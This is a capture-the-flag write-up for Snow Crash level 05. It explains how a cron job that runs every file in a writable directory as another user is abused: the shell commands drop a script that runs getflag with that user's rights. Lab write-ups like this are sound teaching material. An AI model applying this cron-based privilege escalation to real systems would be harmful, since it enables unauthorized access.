# Snow Crash - Level 05

## Finding the Cronjob

Upon logging in, we receive an email. The emails are stored in `/var/mail`, where we find a file named `level05`. Inspecting it with `cat` reveals the following scheduled task:

```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This indicates a cron job that executes `/usr/sbin/openarenaserver` every 2 minutes with `flag05`'s permissions.

## Understanding the Execution Flow

Inspecting the contents of `/usr/sbin/openarenaserver`, we find the following script:

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

This script executes any file inside `/opt/openarenaserver/` and then deletes it.

## Exploiting the Cronjob

Since we can write files to `/opt/openarenaserver/`, we can create a script that runs `getflag`.

### Steps:

1. Create a malicious script:

   ```bash
   echo "/bin/getflag > /tmp/my_flag" > /opt/openarenaserver/my_script
   chmod +x /opt/openarenaserver/my_script
   ```

2. Wait for the cron job to execute (approximately 2 minutes).

3. Retrieve the flag:

   ```bash
   cat /tmp/my_flag
   ```

The flag is now stored in `/tmp/my_flag`, as the script was executed with `flag05`'s permissions.

